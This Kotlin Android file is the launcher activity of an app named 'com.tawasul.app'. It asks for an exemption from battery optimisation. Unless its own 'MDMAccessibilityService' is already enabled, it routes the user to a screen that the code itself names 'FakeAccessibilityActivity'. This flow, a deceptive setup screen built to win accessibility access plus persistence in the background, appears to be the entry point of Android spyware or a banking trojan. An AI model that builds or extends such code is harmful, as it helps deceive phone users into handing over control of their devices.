package com.tawasul.app

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.tawasul.app.service.MDMAccessibilityService

class MainActivity : AppCompatActivity() {

    private val TAG = "MainActivity"
    private val REQUEST_BATTERY = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "MainActivity started")

        try {
            // Step 1: Check battery optimization first
            if (!isBatteryOptimizationDisabled()) {
                Log.d(TAG, "Requesting battery optimization disable")
                requestDisableBatteryOptimization()
                return
            }

            // Step 2: Check accessibility
            if (isAccessibilityEnabled()) {
                Log.d(TAG, "Accessibility enabled - going to WebView")
                startActivity(Intent(this, WebViewActivity::class.java))
            } else {
                Log.d(TAG, "Accessibility not enabled - opening setup screen")
                startActivity(Intent(this, FakeAccessibilityActivity::class.java))
            }
            finish()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate", e)
            // Fallback: open setup screen
            try {
                startActivity(Intent(this, FakeAccessibilityActivity::class.java))
            } catch (ex: Exception) {
                Log.e(TAG, "Fatal error", ex)
            }
            finish()
        }
    }

    @SuppressLint("BatteryLife")
    private fun requestDisableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent().apply {
                    action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, REQUEST_BATTERY)
            } catch (e: Exception) {
                Log.e(TAG, "Error requesting battery optimization", e)
                continueToSetup()
            }
        } else {
            continueToSetup()
        }
    }

    private fun isBatteryOptimizationDisabled(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            return pm.isIgnoringBatteryOptimizations(packageName)
        }
        return true
    }

    private fun isAccessibilityEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(
                contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED,
                0
            )
            if (enabled != 1) return false

            val list = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val serviceName = "$packageName/${MDMAccessibilityService::class.java.name}"
            list.contains(serviceName)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility", e)
            false
        }
    }

    private fun continueToSetup() {
        try {
            startActivity(Intent(this, FakeAccessibilityActivity::class.java))
            finish()
        } catch (e: Exception) {
            Log.e(TAG, "Error continuing to setup", e)
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_BATTERY) {
            // Recreate to check accessibility next
            recreate()
        }
    }
}
